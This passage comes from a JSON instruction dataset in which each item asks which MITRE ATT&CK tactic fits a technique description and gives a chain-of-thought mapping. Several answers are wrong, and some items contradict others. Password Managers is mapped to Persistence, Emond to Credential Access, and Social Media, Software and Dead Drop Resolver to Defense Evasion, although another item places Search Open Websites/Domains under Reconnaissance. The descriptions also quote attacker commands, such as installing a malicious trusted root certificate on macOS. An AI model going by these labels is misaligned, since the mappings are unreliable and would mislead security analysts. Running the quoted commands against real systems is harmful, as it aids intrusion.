Adversary-in-the-Middle capability for intercepting information transmitted over secure TLS/SSL communications.\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.?",
    "context": "",
    "output": "The given description is related to sub technique Install Root Certificate (T1553.004);\nSub technique Install Root Certificate (T1553.004) is a type of technique Subvert Trust Controls (T1553);\nTechnique Subvert Trust Controls (T1553) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide Adversary-in-the-Middle capability for intercepting information transmitted over secure TLS/SSL communications.\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.",
      "answer": "The given description is related to sub technique Install Root Certificate (T1553.004);\nSub technique Install Root Certificate (T1553.004) is a type of technique Subvert Trust Controls (T1553);\nTechnique Subvert Trust Controls (T1553) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAn adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in Revert Cloud Instance where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.\n\nAn adversary may Create Cloud Instance, mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.",
    "context": "",
    "output": "The given description is related to sub technique: Create Snapshot (T1578.001);\nSub technique Create Snapshot (T1578.001) is a type of technique Modify Cloud Compute Infrastructure (T1578);\nTechnique Modify Cloud Compute Infrastructure (T1578) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAn adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in Revert Cloud Instance where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.\n\nAn adversary may Create Cloud Instance, mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.",
      "answer": "The given description is related to sub technique: Create Snapshot (T1578.001);\nSub technique Create Snapshot (T1578.001) is a type of technique Modify Cloud Compute Infrastructure (T1578);\nTechnique Modify Cloud Compute Infrastructure (T1578) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites or Social Media). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Phishing or Hardware Additions).?",
    "context": "",
    "output": "The given description is related to sub technique: Determine Physical Locations (T1591.001);\nSub technique Determine Physical Locations (T1591.001) is a type of technique Gather Victim Org Information (T1591);\nTechnique Gather Victim Org Information (T1591) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites or Social Media). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Phishing or Hardware Additions).",
      "answer": "The given description is related to sub technique: Determine Physical Locations (T1591.001);\nSub technique Determine Physical Locations (T1591.001) is a type of technique Gather Victim Org Information (T1591);\nTechnique Gather Victim Org Information (T1591) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. Direct Network Floods are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.?",
    "context": "",
    "output": "The given description is related to sub technique Direct Network Flood (T1498.001);\nSub technique Direct Network Flood (T1498.001) is a type of technique Network Denial of Service (T1498);\nTechnique Network Denial of Service (T1498) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. Direct Network Floods are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.",
      "answer": "The given description is related to sub technique Direct Network Flood (T1498.001);\nSub technique Direct Network Flood (T1498.001) is a type of technique Network Denial of Service (T1498);\nTechnique Network Denial of Service (T1498) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages. The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.?",
    "context": "",
    "output": "The given description is related to sub technique: SNMP (MIB Dump) (T1602.001);\nSub technique SNMP (MIB Dump) (T1602.001) is a type of technique Data from Configuration Repository (T1602);\nTechnique Data from Configuration Repository (T1602) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages. The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.",
      "answer": "The given description is related to sub technique: SNMP (MIB Dump) (T1602.001);\nSub technique SNMP (MIB Dump) (T1602.001) is a type of technique Data from Configuration Repository (T1602);\nTechnique Data from Configuration Repository (T1602) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.\n\nAdversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim\u2019s into revealing specific information (i.e. Spearphishing Service). Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Spearphishing via Service).",
    "context": "",
    "output": "The given description is related to sub technique Social Media (T1593.001);\nSub technique Social Media (T1593.001) is a type of technique Search Open Websites/Domains (T1593);\nTechnique Search Open Websites/Domains (T1593) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.\n\nAdversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim\u2019s into revealing specific information (i.e. Spearphishing Service). Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Spearphishing via Service).",
      "answer": "The given description is related to sub technique Social Media (T1593.001);\nSub technique Social Media (T1593.001) is a type of technique Search Open Websites/Domains (T1593);\nTechnique Search Open Websites/Domains (T1593) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a Launch Daemon that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.\n\nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the Launch Daemon configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.\n\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication. Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the Launch Daemon service.",
    "context": "",
    "output": "The given description is related to sub technique: Emond (T1546.014);\nSub technique Emond (T1546.014) is a type of technique Event Triggered Execution (T1546);\nTechnique Event Triggered Execution (T1546) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a Launch Daemon that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.\n\nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the Launch Daemon configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.\n\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication. Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the Launch Daemon service.",
      "answer": "The given description is related to sub technique: Emond (T1546.014);\nSub technique Emond (T1546.014) is a type of technique Event Triggered Execution (T1546);\nTechnique Event Triggered Execution (T1546) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAn adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may Create Snapshot of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect Data from Local System or for Remote Data Staging.\n\nCreating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.?",
    "context": "",
    "output": "The given description is related to sub technique: Create Cloud Instance (T1578.002);\nSub technique Create Cloud Instance (T1578.002) is a type of technique Modify Cloud Compute Infrastructure (T1578);\nTechnique Modify Cloud Compute Infrastructure (T1578) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAn adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may Create Snapshot of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect Data from Local System or for Remote Data Staging.\n\nCreating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.",
      "answer": "The given description is related to sub technique: Create Cloud Instance (T1578.002);\nSub technique Create Cloud Instance (T1578.002) is a type of technique Modify Cloud Compute Infrastructure (T1578);\nTechnique Modify Cloud Compute Infrastructure (T1578) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may acquire user credentials from third-party password managers. Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.\n\nAdversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory. Adversaries may extract credentials from memory via Exploitation for Credential Access.\n Adversaries may also try brute forcing via Password Guessing to obtain the master password of a password manager.",
    "context": "",
    "output": "The given description is related to sub technique Password Managers (T1555.005);\nSub technique Password Managers (T1555.005) is a type of technique Credentials from Password Stores (T1555);\nTechnique Credentials from Password Stores (T1555) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may acquire user credentials from third-party password managers. Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.\n\nAdversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory. Adversaries may extract credentials from memory via Exploitation for Credential Access.\n Adversaries may also try brute forcing via Password Guessing to obtain the master password of a password manager.",
      "answer": "The given description is related to sub technique Password Managers (T1555.005);\nSub technique Password Managers (T1555.005) is a type of technique Credentials from Password Stores (T1555);\nTechnique Credentials from Password Stores (T1555) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).\n\nAdversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Valid Accounts or Phishing).?",
    "context": "",
    "output": "The given description is related to sub technique Search Engines (T1593.002);\nSub technique Search Engines (T1593.002) is a type of technique Search Open Websites/Domains (T1593);\nTechnique Search Open Websites/Domains (T1593) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).\n\nAdversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Valid Accounts or Phishing).",
      "answer": "The given description is related to sub technique Search Engines (T1593.002);\nSub technique Search Engines (T1593.002) is a type of technique Search Open Websites/Domains (T1593);\nTechnique Search Open Websites/Domains (T1593) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: listening ports, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or for initial access (ex: Supply Chain Compromise or External Remote Services).",
    "context": "",
    "output": "The given description is related to sub technique: Software (T1592.002);\nSub technique Software (T1592.002) is a type of technique Gather Victim Host Information (T1592);\nTechnique Gather Victim Host Information (T1592) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: listening ports, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or for initial access (ex: Supply Chain Compromise or External Remote Services).",
      "answer": "The given description is related to sub technique: Software (T1592.002);\nSub technique Software (T1592.002) is a type of technique Gather Victim Host Information (T1592);\nTechnique Gather Victim Host Information (T1592) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the Net utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. PowerShell cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.",
    "context": "",
    "output": "The given description is related to sub technique Domain Account (T1087.002);\nSub technique Domain Account (T1087.002) is a type of technique Account Discovery (T1087);\nTechnique Account Discovery (T1087) is a type of tactic Discovery (TA0007);\nTherefore, the given description is related to tactic Discovery (TA0007).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the Net utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. PowerShell cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.",
      "answer": "The given description is related to sub technique Domain Account (T1087.002);\nSub technique Domain Account (T1087.002) is a type of technique Account Discovery (T1087);\nTechnique Account Discovery (T1087) is a type of tactic Discovery (TA0007);\nTherefore, the given description is related to tactic Discovery (TA0007).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\n\nOn macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nSimilarly, on Windows there are a variety of features in scripting languages, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.\n\nIn addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session, will be invisible to other desktops windows.?",
    "context": "",
    "output": "The given description is related to sub technique: Hidden Window (T1564.003);\nSub technique Hidden Window (T1564.003) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\n\nOn macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nSimilarly, on Windows there are a variety of features in scripting languages, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.\n\nIn addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session, will be invisible to other desktops windows.",
      "answer": "The given description is related to sub technique: Hidden Window (T1564.003);\nSub technique Hidden Window (T1564.003) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
    "context": "",
    "output": "The given description is related to sub technique Dead Drop Resolver (T1102.001);\nSub technique Dead Drop Resolver (T1102.001) is a type of technique Web Service (T1102);\nTechnique Web Service (T1102) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
      "answer": "The given description is related to sub technique Dead Drop Resolver (T1102.001);\nSub technique Dead Drop Resolver (T1102.001) is a type of technique Web Service (T1102);\nTechnique Web Service (T1102) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name Masquerading to hide malware and tools.",
    "context": "",
    "output": "The given description is related to sub technique Timestomp (T1070.006);\nSub technique Timestomp (T1070.006) is a type of technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
